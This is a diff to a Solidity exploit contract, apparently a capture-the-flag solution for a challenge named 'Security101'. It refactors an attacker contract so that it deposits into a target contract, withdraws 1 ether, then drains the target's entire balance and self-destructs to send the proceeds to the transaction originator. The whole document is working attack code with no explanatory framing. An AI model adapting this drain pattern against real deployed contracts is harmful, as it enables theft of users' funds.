@@ -26,15 +26,17 @@ interface Target {
 
 contract OptimizedAttackerSecurity101 {
     constructor(Target target) payable {
-        OptimizedAttackerSecurity102 attacker = new OptimizedAttackerSecurity102();
-        attacker.attack{ value: msg.value }(target);
+        OptimizedAttackerSecurity102 attacker = new OptimizedAttackerSecurity102{ value: msg.value }(target);
+        attacker.attack(target);
     }
 }
 
 contract OptimizedAttackerSecurity102 {
-    function attack(Target target) external payable {
+    constructor(Target target) payable{
         target.deposit{ value: msg.value }();
-        target.withdraw(msg.value);
+    }
+    function attack(Target target) external payable {
+        target.withdraw(1 ether);
         target.withdraw(address(target).balance);
         selfdestruct(payable(tx.origin));
     }
